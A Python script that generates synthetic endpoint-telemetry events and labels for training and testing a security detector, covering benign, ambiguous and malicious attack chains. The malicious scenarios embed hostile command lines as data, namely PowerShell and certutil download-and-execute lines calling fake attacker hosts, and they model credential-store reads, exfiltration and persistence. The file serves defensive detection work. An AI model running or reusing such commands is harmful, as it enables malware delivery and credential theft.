#!/usr/bin/env python3
"""Synthetic endpoint-telemetry generator (stand-in for Person 1's collector).

Produces a deterministic JSONL stream of normalized security events plus an
incident label manifest, both following ``docs/event_schema.md``.

Each incident belongs to one **scenario** (e.g. ``benign_office``,
``malicious_credential_phishing_theft``). Scenarios double as split families:
``ml/splits.py`` keeps every incident of a scenario on one side of the
train/test boundary, so near-duplicate variants never leak across the split.

SAFETY: this emits synthetic data only. No real malware, no real domains,
no credentials, no PII. Uses RFC-2606/5737 style names and addresses.

Usage::

    python sentinelllm/data_synthetic/generate_events.py
    python sentinelllm/data_synthetic/generate_events.py --out events.jsonl --seed 7
"""

from __future__ import annotations

import argparse
import csv
import json
import random
from datetime import datetime, timedelta, timezone
from functools import partial
from pathlib import Path
from typing import Callable

SCHEMA_VERSION = "1.0"
DEFAULT_SEED = 20260901
HOST = "WIN-LAB-01"
USER = "synthetic_user"

PACKAGE_ROOT = Path(__file__).resolve().parents[1]
DEFAULT_EVENTS = PACKAGE_ROOT / "data_synthetic" / "events.jsonl"
DEFAULT_LABELS = PACKAGE_ROOT / "data_synthetic" / "incident_labels.csv"

BENIGN_DOMAINS = [
    "www.wikipedia.org", "cdn.example.com", "update.example.org",
    "pypi.example.com", "mail.example.net", "docs.example.com",
    "backup.example.com", "teams.example.net",
]
SUSPICIOUS_DOMAINS = [
    "a7f3k2-cdn-update.top", "cloudflare-verify.support",
    "verify-account-secure.click", "windows-update-check.xyz",
    "session-refresh-portal.top", "cdn-delivery-node.top",
]
INTERNAL_IPS = ["10.0.0.5", "10.0.0.21", "10.0.0.34"]
BENIGN_IPS = ["192.0.2.10", "192.0.2.44", "198.51.100.7", "198.51.100.23"]
SUSPICIOUS_IPS = ["203.0.113.66", "203.0.113.19", "198.51.100.200"]

BENIGN_LABEL = "benign"
SUSPICIOUS_LABEL = "suspicious"
MALICIOUS_LABEL = "malicious"


def _sha256(rng: random.Random) -> str:
    return "".join(rng.choice("0123456789abcdef") for _ in range(64))


def _exe(rng: random.Random, prefix: str) -> str:
    return f"{prefix}{rng.randint(1000, 9999)}.exe"


def _iso(ts: datetime) -> str:
    return ts.astimezone(timezone.utc).replace(microsecond=0).isoformat().replace("+00:00", "Z")


def _file(path: str, category: str, rng: random.Random, clock: datetime, *, extension: str | None = None, signed: bool | None = None, signer: str | None = None, size: tuple[int, int] = (1_000, 100_000)) -> dict:
    name = Path(path.replace("\\", "/")).name
    return {
        "path": path,
        "name": name,
        "sha256": _sha256(rng),
        "size_bytes": rng.randint(*size),
        "extension": extension if extension is not None else Path(name).suffix,
        "signed": signed,
        "signer": signer,
        "first_seen": _iso(clock),
        "path_category": category,
    }


class EventFactory:
    """Assigns unique event IDs and stamps the common envelope on every event."""

    def __init__(self, rng: random.Random) -> None:
        self.rng = rng
        self._counter = 0

    def make(self, incident_id: str, label: str, ts: datetime, event_type: str, rules: list[str] | None, **fields: object) -> dict:
        self._counter += 1
        event: dict = {
            "schema_version": SCHEMA_VERSION,
            "event_id": f"E{self._counter:06d}",
            "incident_id": incident_id,
            "timestamp": _iso(ts),
            "event_type": event_type,
            "host": HOST,
            "user": USER,
            "source": "collector",
            "label": label,
            "rule_hits": sorted(rules) if rules else [],
        }
        event.update(fields)
        return event


class IncidentBuilder:
    """Accumulates one incident's events, advancing a clock between them."""

    def __init__(self, factory: EventFactory, incident_id: str, label: str, start: datetime) -> None:
        self.factory = factory
        self.incident_id = incident_id
        self.label = label
        self.clock = start
        self.events: list[dict] = []

    def emit(self, event_type: str, rules: list[str] | None = None, gap_s: int | None = None, **fields: object) -> None:
        self.events.append(self.factory.make(self.incident_id, self.label, self.clock, event_type, rules, **fields))
        self.clock += timedelta(seconds=self.factory.rng.randint(1, 25) if gap_s is None else gap_s)

    def process(self, name: str, path: str, cmdline: str, parent: str, parent_path: str, *, signed: bool = True, signer: str | None = "Microsoft Corporation", rules: list[str] | None = None) -> None:
        self.emit("process_create", rules=rules, process={
            "pid": self.factory.rng.randint(1000, 9000),
            "ppid": self.factory.rng.randint(400, 999),
            "name": name, "path": path, "cmdline": cmdline,
            "parent_name": parent, "parent_path": parent_path,
            "integrity_level": "medium", "signed": signed, "signer": signer,
            "sha256": _sha256(self.factory.rng),
        })


# --------------------------------------------------------------------------- #
# Benign scenarios
# --------------------------------------------------------------------------- #
def build_benign(factory: EventFactory, iid: str, rng: random.Random, start: datetime, variant: str) -> tuple[str, list[dict]]:
    b = IncidentBuilder(factory, iid, BENIGN_LABEL, start)

    if variant == "browsing":
        b.process("chrome.exe", r"C:\Program Files\Google\Chrome\Application\chrome.exe", "chrome.exe", "explorer.exe", r"C:\Windows\explorer.exe")
        b.emit("browser_event", browser={"browser": "chrome", "url": f"https://{rng.choice(BENIGN_DOMAINS)}/", "page_kind": "benign_website", "action": "navigate"})
        b.emit("dns_query", dns={"query": rng.choice(BENIGN_DOMAINS), "response_ip": rng.choice(BENIGN_IPS), "is_rare": False})
        b.emit("network_connect", network={"dst_ip": rng.choice(BENIGN_IPS), "dst_domain": rng.choice(BENIGN_DOMAINS), "dst_port": 443, "protocol": "tcp", "direction": "outbound", "bytes_out": rng.randint(500, 40_000)})
    elif variant == "office":
        b.process("WINWORD.EXE", r"C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE", "WINWORD.EXE report.docx", "explorer.exe", r"C:\Windows\explorer.exe")
        b.emit("file_create", file=_file(rf"C:\Users\{USER}\Documents\report{rng.randint(1, 99)}.docx", "documents", rng, b.clock, size=(20_000, 900_000)))
        b.emit("file_modify", file=_file(rf"C:\Users\{USER}\Documents\report{rng.randint(1, 99)}.docx", "documents", rng, b.clock, size=(20_000, 900_000)))
    elif variant == "update":
        b.process("TiWorker.exe", r"C:\Windows\WinSxS\TiWorker.exe", "TiWorker.exe -Embedding", "services.exe", r"C:\Windows\System32\services.exe")
        b.emit("network_connect", network={"dst_ip": rng.choice(BENIGN_IPS), "dst_domain": "update.example.org", "dst_port": 443, "protocol": "tcp", "direction": "outbound", "bytes_out": rng.randint(1_000, 250_000)})
        b.emit("file_create", file=_file(r"C:\Windows\SoftwareDistribution\Download\update.cab", "windows", rng, b.clock, signed=True, signer="Microsoft Corporation", size=(50_000, 5_000_000)))
    elif variant == "dev":
        b.process("python.exe", r"C:\Program Files\Python312\python.exe", "python.exe build.py", "Code.exe", rf"C:\Users\{USER}\AppData\Local\Programs\Microsoft VS Code\Code.exe")
        b.emit("file_create", file=_file(rf"C:\Users\{USER}\Documents\project\build_{rng.randint(1, 50)}.py", "documents", rng, b.clock, size=(200, 20_000)))
        b.emit("network_connect", network={"dst_ip": rng.choice(BENIGN_IPS), "dst_domain": "pypi.example.com", "dst_port": 443, "protocol": "tcp", "direction": "outbound", "bytes_out": rng.randint(2_000, 60_000)})
    elif variant == "backup":
        b.process("robocopy.exe", r"C:\Windows\System32\robocopy.exe", r"robocopy.exe C:\data D:\backup /MIR", "svchost.exe", r"C:\Windows\System32\svchost.exe")
        b.emit("network_connect", network={"dst_ip": "10.0.0.21", "dst_domain": "backup.example.com", "dst_port": 445, "protocol": "tcp", "direction": "outbound", "bytes_out": rng.randint(10_000, 900_000)})
        b.emit("file_create", file=_file(r"D:\backup\job.log", "other", rng, b.clock, size=(1_000, 50_000)))
    elif variant == "conferencing":
        b.process("ms-teams.exe", rf"C:\Users\{USER}\AppData\Local\Microsoft\Teams\current\Teams.exe", "ms-teams.exe --processStart", "explorer.exe", r"C:\Windows\explorer.exe")
        b.emit("network_connect", network={"dst_ip": rng.choice(BENIGN_IPS), "dst_domain": "teams.example.net", "dst_port": 443, "protocol": "tcp", "direction": "outbound", "bytes_out": rng.randint(5_000, 400_000)})
        b.emit("file_create", file=_file(rf"C:\Users\{USER}\AppData\Roaming\Microsoft\Teams\cache\{rng.randint(1,999)}.tmp", "appdata", rng, b.clock, size=(1_000, 80_000)))
    elif variant == "admin_script":
        # Visible maintenance script: no hidden window, no ExecutionPolicy bypass.
        b.process("powershell.exe", r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe", "powershell.exe -NoProfile -File health_check.ps1", "taskhostw.exe", r"C:\Windows\System32\taskhostw.exe")
        b.emit("file_create", file=_file(rf"C:\Users\{USER}\Documents\health_check.ps1", "documents", rng, b.clock, size=(500, 8_000)))
    elif variant == "media":
        b.process("vlc.exe", r"C:\Program Files\VideoLAN\VLC\vlc.exe", "vlc.exe movie.mp4", "explorer.exe", r"C:\Windows\explorer.exe")
        b.emit("file_create", file=_file(rf"C:\Users\{USER}\Documents\movie_{rng.randint(1, 99)}.mp4", "documents", rng, b.clock, size=(1_000_000, 40_000_000)))
    elif variant == "signed_installer_temp":
        # Signed installer staged in Temp: risky-looking path, but valid signature.
        name = _exe(rng, "setup")
        path = rf"C:\Users\{USER}\AppData\Local\Temp\{name}"
        b.process(name, path, f"{name} /S", "explorer.exe", r"C:\Windows\explorer.exe", signer="Contoso Ltd")
        b.emit("file_create", file=_file(path, "temp", rng, b.clock, signed=True, signer="Contoso Ltd", size=(1_000_000, 20_000_000)))
        b.emit("network_connect", network={"dst_ip": rng.choice(BENIGN_IPS), "dst_domain": "cdn.example.com", "dst_port": 443, "protocol": "tcp", "direction": "outbound", "bytes_out": rng.randint(1_000, 30_000)})
    elif variant == "browser_self_access":  # a browser reading its own credential store
        b.process("chrome.exe", r"C:\Program Files\Google\Chrome\Application\chrome.exe", "chrome.exe", "explorer.exe", r"C:\Windows\explorer.exe")
        b.emit("file_access", file=_file(rf"C:\Users\{USER}\AppData\Local\Google\Chrome\User Data\Default\Login Data", "appdata", rng, b.clock, extension="", size=(40_000, 200_000)))
        b.emit("network_connect", network={"dst_ip": rng.choice(BENIGN_IPS), "dst_domain": "cdn.example.com", "dst_port": 443, "protocol": "tcp", "direction": "outbound", "bytes_out": rng.randint(500, 9_000)})
    else:  # encoded_admin_tool - a legitimately encoded maintenance command
        b.process("powershell.exe", r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
                  "powershell.exe -NoProfile -EncodedCommand RwBlAHQALQBTAGUAcgB2AGkAYwBlACAAVwBpAG4ARABlAGYAZQBuAGQAZQBy",
                  "taskhostw.exe", r"C:\Windows\System32\taskhostw.exe", rules=["R011"])
    return f"benign_{variant}", b.events


# --------------------------------------------------------------------------- #
# Ambiguous: benign but risky-looking. False-positive pressure.
# --------------------------------------------------------------------------- #
def build_ambiguous(factory: EventFactory, iid: str, rng: random.Random, start: datetime, variant: str) -> tuple[str, list[dict]]:
    b = IncidentBuilder(factory, iid, BENIGN_LABEL, start)

    if variant == "unsigned_temp_tool":
        name = _exe(rng, "mytool")
        path = rf"C:\Users\{USER}\AppData\Local\Temp\{name}"
        b.process(name, path, f"{name} --build", "explorer.exe", r"C:\Windows\explorer.exe", signed=False, signer=None, rules=["R005"])
        b.emit("file_create", file=_file(path, "temp", rng, b.clock, signed=False, size=(100_000, 3_000_000)))
        b.emit("network_connect", network={"dst_ip": rng.choice(INTERNAL_IPS), "dst_domain": "build.example.com", "dst_port": 8080, "protocol": "tcp", "direction": "outbound", "bytes_out": rng.randint(500, 5_000)})
    elif variant == "portable_app":
        name = _exe(rng, "portable")
        path = rf"C:\Users\{USER}\Downloads\{name}"
        b.process(name, path, f"{name}", "explorer.exe", r"C:\Windows\explorer.exe", signed=False, signer=None, rules=["R005"])
        b.emit("file_create", file=_file(path, "downloads", rng, b.clock, signed=False, size=(1_000_000, 20_000_000)))
        b.emit("network_connect", network={"dst_ip": rng.choice(BENIGN_IPS), "dst_domain": "cdn.example.com", "dst_port": 443, "protocol": "tcp", "direction": "outbound", "bytes_out": rng.randint(1_000, 20_000)})
    else:  # custom_script (visible window, local only)
        script = rf"C:\Users\{USER}\Downloads\setup_{rng.randint(100, 999)}.ps1"
        b.process("powershell.exe", r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe", f"powershell.exe -File \"{script}\"", "explorer.exe", r"C:\Windows\explorer.exe")
        b.emit("file_create", file=_file(script, "downloads", rng, b.clock, signed=False, size=(500, 10_000)))
    return f"ambiguous_{variant}", b.events


# --------------------------------------------------------------------------- #
# Suspicious: high-risk behavior without corroboration (no download/cred/exfil/AV)
# --------------------------------------------------------------------------- #
def build_suspicious(factory: EventFactory, iid: str, rng: random.Random, start: datetime, variant: str) -> tuple[str, list[dict]]:
    b = IncidentBuilder(factory, iid, SUSPICIOUS_LABEL, start)

    if variant == "hidden_script":
        b.process("powershell.exe", r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
                  "powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File admin_maintenance.ps1",
                  "taskhostw.exe", r"C:\Windows\System32\taskhostw.exe", rules=["R001", "R002"])
        b.emit("file_create", file=_file(rf"C:\Users\{USER}\Documents\admin_maintenance.ps1", "documents", rng, b.clock, size=(500, 8_000)))
    elif variant == "encoded_command":
        b.process("powershell.exe", r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
                  "powershell.exe -NoProfile -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoA",
                  "explorer.exe", r"C:\Windows\explorer.exe", rules=["R011"])
    else:  # lolbin_recon
        dll = rf"C:\Users\{USER}\AppData\Local\{_exe(rng, 'lib').replace('.exe', '.dll')}"
        b.process("rundll32.exe", r"C:\Windows\System32\rundll32.exe", f"rundll32.exe {dll},EntryPoint",
                  "explorer.exe", r"C:\Windows\explorer.exe", rules=["R009"])
        b.emit("file_create", file=_file(dll, "appdata", rng, b.clock, signed=False, size=(20_000, 500_000)))
    return f"suspicious_{variant}", b.events


# --------------------------------------------------------------------------- #
# Malicious attack chains
# --------------------------------------------------------------------------- #
def build_clickfix_stealer(factory: EventFactory, iid: str, rng: random.Random, start: datetime) -> tuple[str, list[dict]]:
    b = IncidentBuilder(factory, iid, MALICIOUS_LABEL, start)
    domain = rng.choice(SUSPICIOUS_DOMAINS)
    payload = _exe(rng, "svc")
    payload_path = rf"C:\Users\{USER}\AppData\Local\Temp\{payload}"
    archive = rf"C:\Users\{USER}\AppData\Local\Temp\pkg{rng.randint(100, 999)}.zip"

    b.emit("browser_event", browser={"browser": "chrome", "url": f"https://{domain}/verify", "page_kind": "fake_verification", "action": "navigate"})
    b.emit("clipboard_event", rules=["R010"], clipboard={"content_preview": "powershell -w hidden -ep bypass -c \"iex(irm ...)\"", "page_kind": "clickfix_instruction"})
    b.process("powershell.exe", r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
              "powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command \"IEX (New-Object Net.WebClient).DownloadString('https://a7f3k2-cdn-update.top/a.ps1')\"",
              "explorer.exe", r"C:\Windows\explorer.exe", rules=["R001", "R002"])
    b.emit("dns_query", rules=["R003"], dns={"query": domain, "response_ip": rng.choice(SUSPICIOUS_IPS), "is_rare": True})
    b.emit("network_connect", rules=["R003", "R007"], network={"dst_ip": rng.choice(SUSPICIOUS_IPS), "dst_domain": domain, "dst_port": 443, "protocol": "tcp", "direction": "outbound", "bytes_out": rng.randint(5_000, 90_000)})
    b.emit("file_create", rules=["R004"], file=_file(archive, "temp", rng, b.clock, size=(100_000, 2_000_000)))
    b.process(payload, payload_path, payload, "powershell.exe", r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe", signed=False, signer=None, rules=["R005"])
    b.emit("file_access", rules=["R006"], file=_file(rf"C:\Users\{USER}\AppData\Local\Google\Chrome\User Data\Default\Login Data", "appdata", rng, b.clock, extension="", size=(40_000, 200_000)))
    b.emit("network_connect", rules=["R007"], network={"dst_ip": rng.choice(SUSPICIOUS_IPS), "dst_domain": domain, "dst_port": 8443, "protocol": "tcp", "direction": "outbound", "bytes_out": rng.randint(50_000, 400_000)})
    b.emit("av_detect", av={"engine": "Defender", "detection_name": "Trojan:Win32/Wacatac.B!ml", "severity": "severe", "target_path": payload_path, "target_sha256": _sha256(rng)})
    b.emit("quarantine", quarantine={"action": "quarantined", "target_path": payload_path, "target_sha256": _sha256(rng), "reason": "policy: corroborated multi-signal"})
    return "malicious_clickfix_staged_stealer", b.events


def build_credential_phishing(factory: EventFactory, iid: str, rng: random.Random, start: datetime) -> tuple[str, list[dict]]:
    b = IncidentBuilder(factory, iid, MALICIOUS_LABEL, start)
    domain = rng.choice(SUSPICIOUS_DOMAINS)
    script = rf"C:\Users\{USER}\Downloads\invoice_{rng.randint(1000, 9999)}.js"

    b.emit("browser_event", browser={"browser": "edge", "url": f"https://{domain}/login", "page_kind": "fake_login", "action": "navigate"})
    b.emit("browser_event", browser={"browser": "edge", "url": f"https://{domain}/download", "page_kind": "fake_download", "action": "download_click"})
    b.emit("file_create", rules=["R005"], file=_file(script, "downloads", rng, b.clock, signed=False, size=(2_000, 40_000)))
    b.process("wscript.exe", r"C:\Windows\System32\wscript.exe", f"wscript.exe \"{script}\"", "explorer.exe", r"C:\Windows\explorer.exe", rules=["R009"])
    b.emit("file_access", rules=["R006"], file=_file(rf"C:\Users\{USER}\AppData\Local\Microsoft\Edge\User Data\Default\Cookies", "appdata", rng, b.clock, extension="", size=(30_000, 150_000)))
    b.emit("network_connect", rules=["R007"], network={"dst_ip": rng.choice(SUSPICIOUS_IPS), "dst_domain": domain, "dst_port": 443, "protocol": "tcp", "direction": "outbound", "bytes_out": rng.randint(20_000, 250_000)})
    return "malicious_credential_phishing_theft", b.events


def build_persistence_loader(factory: EventFactory, iid: str, rng: random.Random, start: datetime) -> tuple[str, list[dict]]:
    b = IncidentBuilder(factory, iid, MALICIOUS_LABEL, start)
    domain = rng.choice(SUSPICIOUS_DOMAINS)
    payload = _exe(rng, "update")
    payload_path = rf"C:\Users\{USER}\AppData\Roaming\{payload}"

    b.process("powershell.exe", r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
              "powershell.exe -w hidden -c \"iwr https://windows-update-check.xyz/p.ps1 -OutFile $env:TEMP\\p.ps1; & $env:TEMP\\p.ps1\"",
              "explorer.exe", r"C:\Windows\explorer.exe", rules=["R001", "R003"])
    b.emit("network_connect", rules=["R003", "R007"], network={"dst_ip": rng.choice(SUSPICIOUS_IPS), "dst_domain": domain, "dst_port": 443, "protocol": "tcp", "direction": "outbound", "bytes_out": rng.randint(3_000, 60_000)})
    b.emit("file_create", rules=["R005"], file=_file(payload_path, "appdata", rng, b.clock, signed=False, size=(80_000, 1_500_000)))
    b.emit("registry_set", rules=["R008"], registry={"hive": "HKCU", "key": r"Software\Microsoft\Windows\CurrentVersion\Run", "value_name": "WindowsUpdateSvc", "value_data": payload_path})
    b.emit("scheduled_task_create", rules=["R008"], task={"task_name": "SystemHealthCheck", "action": payload_path, "trigger": "onlogon"})
    b.emit("service_install", rules=["R008"], service={"service_name": "WinHealthSvc", "binary_path": payload_path, "start_type": "auto"})
    return "malicious_persistence_loader", b.events


def build_remote_access_loader(factory: EventFactory, iid: str, rng: random.Random, start: datetime) -> tuple[str, list[dict]]:
    b = IncidentBuilder(factory, iid, MALICIOUS_LABEL, start)
    domain = rng.choice(SUSPICIOUS_DOMAINS)
    payload = _exe(rng, "host")
    payload_path = rf"C:\Users\{USER}\AppData\Roaming\{payload}"

    b.process("powershell.exe", r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
              "powershell.exe -w hidden -c \"iex(irm https://cdn-delivery-node.top/x.ps1)\"",
              "explorer.exe", r"C:\Windows\explorer.exe", rules=["R001", "R003"])
    b.emit("network_connect", rules=["R007"], network={"dst_ip": rng.choice(SUSPICIOUS_IPS), "dst_domain": domain, "dst_port": 443, "protocol": "tcp", "direction": "outbound", "bytes_out": rng.randint(2_000, 30_000)})
    b.emit("file_create", rules=["R005"], file=_file(payload_path, "appdata", rng, b.clock, signed=False, size=(200_000, 2_000_000)))
    b.process(payload, payload_path, payload, "powershell.exe", r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe", signed=False, signer=None, rules=["R005"])
    b.emit("network_connect", rules=["R007"], network={"dst_ip": rng.choice(SUSPICIOUS_IPS), "dst_domain": domain, "dst_port": 8443, "protocol": "tcp", "direction": "outbound", "bytes_out": rng.randint(1_000, 5_000)})
    return "malicious_remote_access_loader", b.events


def build_extension_hijack(factory: EventFactory, iid: str, rng: random.Random, start: datetime) -> tuple[str, list[dict]]:
    b = IncidentBuilder(factory, iid, MALICIOUS_LABEL, start)
    domain = rng.choice(SUSPICIOUS_DOMAINS)
    ext = rf"C:\Users\{USER}\AppData\Local\Google\Chrome\User Data\Default\Extensions\m{fakerng(rng)}"
    manifest = rf"{ext}\3.1.0_0\manifest.json"

    b.emit("browser_event", browser={"browser": "chrome", "url": f"https://{domain}/update", "page_kind": "fake_update", "action": "navigate"})
    b.emit("file_create", rules=["R005"], file=_file(manifest, "appdata", rng, b.clock, extension=".json", signed=False, size=(1_000, 8_000)))
    b.emit("network_connect", rules=["R007"], network={"dst_ip": rng.choice(SUSPICIOUS_IPS), "dst_domain": domain, "dst_port": 443, "protocol": "tcp", "direction": "outbound", "bytes_out": rng.randint(5_000, 60_000)})
    return "malicious_browser_extension_hijack", b.events


def build_obfuscated_loader(factory: EventFactory, iid: str, rng: random.Random, start: datetime) -> tuple[str, list[dict]]:
    """Obfuscated: encoded command, no '-w hidden'/'-ep bypass', no script download."""
    b = IncidentBuilder(factory, iid, MALICIOUS_LABEL, start)
    domain = rng.choice(SUSPICIOUS_DOMAINS)
    payload = _exe(rng, "enc")
    payload_path = rf"C:\Users\{USER}\AppData\Local\{payload}"

    b.process("powershell.exe", r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
              "powershell.exe -NoProfile -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA",
              "explorer.exe", r"C:\Windows\explorer.exe", rules=["R011"])
    b.emit("file_create", rules=["R005"], file=_file(payload_path, "appdata", rng, b.clock, signed=False, size=(50_000, 900_000)))
    b.emit("file_access", rules=["R006"], file=_file(rf"C:\Users\{USER}\AppData\Local\Google\Chrome\User Data\Default\Login Data", "appdata", rng, b.clock, extension="", size=(40_000, 200_000)))
    b.emit("network_connect", rules=["R007"], network={"dst_ip": rng.choice(SUSPICIOUS_IPS), "dst_domain": domain, "dst_port": 443, "protocol": "tcp", "direction": "outbound", "bytes_out": rng.randint(10_000, 120_000)})
    return "malicious_obfuscated_loader", b.events


def build_signed_lolbin_loader(factory: EventFactory, iid: str, rng: random.Random, start: datetime) -> tuple[str, list[dict]]:
    """Living off the land: signed certutil downloading a payload - nothing unsigned or in Temp."""
    b = IncidentBuilder(factory, iid, MALICIOUS_LABEL, start)
    domain = rng.choice(SUSPICIOUS_DOMAINS)

    b.process("certutil.exe", r"C:\Windows\System32\certutil.exe",
              f"certutil.exe -urlcache -split -f https://{domain}/p.exe payload.bin",
              "explorer.exe", r"C:\Windows\explorer.exe", rules=["R003", "R009"])
    b.emit("network_connect", rules=["R007"], network={"dst_ip": rng.choice(SUSPICIOUS_IPS), "dst_domain": domain, "dst_port": 443, "protocol": "tcp", "direction": "outbound", "bytes_out": rng.randint(40_000, 300_000)})
    return "malicious_signed_lolbin_loader", b.events


def build_encoded_only_loader(factory: EventFactory, iid: str, rng: random.Random, start: datetime) -> tuple[str, list[dict]]:
    """Stealthy: only an encoded command. Intentionally indistinguishable from
    ``benign_encoded_admin_tool`` on our features - this sets an honest error floor
    and motivates the evidence-grounded LLM layer.
    """
    b = IncidentBuilder(factory, iid, MALICIOUS_LABEL, start)
    b.process("powershell.exe", r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
              "powershell.exe -NoProfile -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA",
              "explorer.exe", r"C:\Windows\explorer.exe", rules=["R011"])
    return "malicious_encoded_only_loader", b.events


def fakerng(rng: random.Random) -> str:
    return "".join(rng.choice("abcdefghijklmnop") for _ in range(32))


# --------------------------------------------------------------------------- #
# Scenario registry: name -> builder, with labels and default counts
# --------------------------------------------------------------------------- #
BUILDERS: dict[str, Callable[..., tuple[str, list[dict]]]] = {
    **{f"benign_{v}": partial(build_benign, variant=v) for v in ["browsing", "office", "update", "dev", "backup", "conferencing", "admin_script", "media", "signed_installer_temp", "browser_self_access", "encoded_admin_tool"]},
    **{f"ambiguous_{v}": partial(build_ambiguous, variant=v) for v in ["unsigned_temp_tool", "portable_app", "custom_script"]},
    **{f"suspicious_{v}": partial(build_suspicious, variant=v) for v in ["hidden_script", "encoded_command", "lolbin_recon"]},
    "malicious_clickfix_staged_stealer": build_clickfix_stealer,
    "malicious_credential_phishing_theft": build_credential_phishing,
    "malicious_persistence_loader": build_persistence_loader,
    "malicious_remote_access_loader": build_remote_access_loader,
    "malicious_browser_extension_hijack": build_extension_hijack,
    "malicious_obfuscated_loader": build_obfuscated_loader,
    "malicious_signed_lolbin_loader": build_signed_lolbin_loader,
    "malicious_encoded_only_loader": build_encoded_only_loader,
}

DEFAULT_COUNTS: dict[str, int] = {
    "benign_browsing": 8, "benign_office": 8, "benign_update": 8, "benign_dev": 8,
    "benign_backup": 6, "benign_conferencing": 6, "benign_admin_script": 6, "benign_media": 6,
    "benign_signed_installer_temp": 6, "benign_browser_self_access": 6, "benign_encoded_admin_tool": 6,
    "ambiguous_unsigned_temp_tool": 6, "ambiguous_portable_app": 6, "ambiguous_custom_script": 6,
    "suspicious_hidden_script": 6, "suspicious_encoded_command": 6, "suspicious_lolbin_recon": 6,
    "malicious_clickfix_staged_stealer": 8, "malicious_credential_phishing_theft": 8,
    "malicious_persistence_loader": 8, "malicious_remote_access_loader": 7, "malicious_browser_extension_hijack": 7,
    "malicious_obfuscated_loader": 7, "malicious_signed_lolbin_loader": 7, "malicious_encoded_only_loader": 7,
}


def generate(counts: dict[str, int], seed: int) -> tuple[list[dict], list[dict]]:
    rng = random.Random(seed)
    factory = EventFactory(rng)
    base = datetime(2026, 9, 14, 8, 0, 0, tzinfo=timezone.utc)

    events: list[dict] = []
    manifest: list[dict] = []
    index = 1
    for scenario, count in counts.items():
        builder = BUILDERS[scenario]
        for _ in range(count):
            iid = f"INC-{index:04d}"
            index += 1
            start = base + timedelta(minutes=rng.randint(0, 60 * 24 * 10))
            scenario_name, built = builder(factory, iid, rng, start)
            events.extend(built)
            manifest.append({"incident_id": iid, "label": built[0]["label"], "scenario": scenario_name, "event_count": len(built)})

    events.sort(key=lambda e: (e["timestamp"], e["event_id"]))
    return events, manifest


def write_outputs(events: list[dict], manifest: list[dict], events_path: Path, labels_path: Path) -> None:
    events_path.parent.mkdir(parents=True, exist_ok=True)
    labels_path.parent.mkdir(parents=True, exist_ok=True)
    with events_path.open("w", encoding="utf-8") as fh:
        for event in events:
            fh.write(json.dumps(event, sort_keys=False) + "\n")
    with labels_path.open("w", encoding="utf-8", newline="") as fh:
        writer = csv.DictWriter(fh, fieldnames=["incident_id", "label", "scenario", "event_count"])
        writer.writeheader()
        writer.writerows(manifest)


def main() -> None:
    parser = argparse.ArgumentParser(description="Generate synthetic SentinelLLM events.")
    parser.add_argument("--out", type=Path, default=DEFAULT_EVENTS)
    parser.add_argument("--labels-out", type=Path, default=DEFAULT_LABELS)
    parser.add_argument("--seed", type=int, default=DEFAULT_SEED)
    parser.add_argument("--scale", type=float, default=1.0, help="Multiply every scenario count by this factor.")
    args = parser.parse_args()

    counts = {name: max(1, round(n * args.scale)) for name, n in DEFAULT_COUNTS.items()}
    events, manifest = generate(counts, args.seed)
    write_outputs(events, manifest, args.out, args.labels_out)

    labels: dict[str, int] = {}
    for row in manifest:
        labels[row["label"]] = labels.get(row["label"], 0) + 1
    print(f"Wrote {len(events)} events across {len(manifest)} incidents -> {args.out}")
    print(f"Scenarios: {len({r['scenario'] for r in manifest})} | Incident labels: {labels}")


if __name__ == "__main__":
    main()
